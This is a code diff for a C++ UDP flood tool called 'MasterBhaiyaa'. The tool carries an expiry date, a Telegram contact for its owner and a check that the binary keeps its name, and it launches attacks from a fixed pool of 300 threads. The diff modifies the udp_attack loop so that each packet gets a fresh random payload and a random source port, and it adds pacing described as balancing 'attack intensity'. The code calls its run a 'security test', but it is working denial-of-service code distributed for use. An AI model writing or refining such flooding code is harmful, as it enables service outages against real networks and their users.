@@ -12,10 +12,9 @@
 #include <unistd.h>
 
 #define DEFAULT_PAYLOAD_SIZE 30
-#define FIXED_THREAD_COUNT 400  // Fixed number of threads
-#define BINARY_NAME "MasterBhaiyaa"  // The required binary name
+#define FIXED_THREAD_COUNT 300
+#define BINARY_NAME "MasterBhaiyaa"
 
-// Expiration Date
 constexpr int EXPIRATION_YEAR = 2054;
 constexpr int EXPIRATION_MONTH = 11;
 constexpr int EXPIRATION_DAY = 1;
@@ -29,7 +28,7 @@ struct AttackConfig {
     int payload_size;
 };
 
-// Signal handler for stopping
+// Signal handler
 void handle_signal(int signal) {
     std::cout << "\n[!] Interrupt received. Stopping security test...\n";
     stop_flag = true;
@@ -57,19 +56,19 @@ void check_expiration() {
         std::cerr << "╔════════════════════════════════════════╗\n";
         std::cerr << "║           BINARY EXPIRED!              ║\n";
         std::cerr << "║    Please contact the owner at:        ║\n";
-        std::cerr << "║    Telegram: @Team_Pro_Player               ║\n";
+        std::cerr << "║    Telegram: @Team_Pro_Player         ║\n";
         std::cerr << "╚════════════════════════════════════════╝\n";
         exit(EXIT_FAILURE);
     }
 }
 
-// Check if the binary has been renamed
+// Check binary name
 void check_binary_name() {
     char exe_path[1024];
     ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
     
     if (len != -1) {
-        exe_path[len] = '\0'; // Null-terminate the string
+        exe_path[len] = '\0';
         std::string exe_name = std::string(exe_path);
         size_t pos = exe_name.find_last_of("/");
 
@@ -77,7 +76,6 @@ void check_binary_name() {
             exe_name = exe_name.substr(pos + 1);
         }
 
-        // Check if the binary name matches "MasterBhaiyaa"
         if (exe_name != BINARY_NAME) {
             std::cerr << "╔════════════════════════════════════════╗\n";
             std::cerr << "║         INVALID BINARY NAME!           ║\n";
@@ -94,7 +92,7 @@ bool is_valid_ip(const std::string &ip) {
     return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
 }
 
-// UDP packet sending function
+// UDP attack function with optimized packet sending
 void udp_attack(const AttackConfig &config) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
@@ -113,12 +111,24 @@ void udp_attack(const AttackConfig &config) {
     auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);
     
     while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
+        // Generate new payload each time for randomness
+        generate_payload(payload, config.payload_size);
+        
+        // Randomized source port
+        sockaddr_in source_addr = {};
+        source_addr.sin_family = AF_INET;
+        source_addr.sin_port = htons(rand() % 65535);
+        bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr));
+
         ssize_t sent = sendto(sock, payload.c_str(), payload.size(), 0, 
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
         if (sent < 0) {
             perror("Send failed");
             break;
         }
+
+        // Dynamic pacing to balance attack intensity
+        std::this_thread::sleep_for(std::chrono::milliseconds(10 + (rand() % 5)));
     }
 
     close(sock);
@@ -126,10 +136,8 @@ void udp_attack(const AttackConfig &config) {
 
 // Main function
 int main(int argc, char *argv[]) {
-    // Ensure the binary has not been renamed
     check_binary_name();
 
-    // Print Program Header
     std::cout << "╔════════════════════════════════════════╗\n";
     std::cout << "║          MasterBhaiyaa PROGRAM         ║\n";
     std::cout << "║         Copyright (c) 2024             ║\n";
@@ -146,7 +154,6 @@ int main(int argc, char *argv[]) {
     config.duration = std::stoi(argv[3]);
     config.payload_size = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_PAYLOAD_SIZE;
 
-    // Validate IP Address
     if (!is_valid_ip(config.ip)) {
         std::cerr << "Invalid IP address: " << config.ip << "\n";
         return EXIT_FAILURE;
